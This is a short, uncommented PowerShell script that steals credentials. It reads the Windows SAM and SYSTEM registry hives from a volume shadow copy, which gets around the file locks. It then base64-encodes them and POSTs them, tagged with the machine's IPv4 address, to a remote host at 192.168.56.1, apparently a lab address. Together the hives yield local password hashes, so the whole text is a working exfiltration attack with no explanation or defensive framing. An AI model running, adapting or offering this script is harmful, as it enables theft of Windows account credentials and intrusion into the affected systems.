$IP = "[IP: "+ (Get-NetIPAddress | ?{$_.InterfaceAlias -like "ethernet*" -and $_.AddressFamily -like "ipv4"}| %{$_.ipaddress}) +"]";
$sam_b64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SAM'));
$system_b64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM'));
$body = $IP + "`n" + "SAM:" + "`n" + $sam_b64 + "`n" + "SYSTEM:"+ "`n" + $system_b64;

Invoke-WebRequest -Uri "http://192.168.56.1" -Body $body -Method Post -UseBasicParsing;

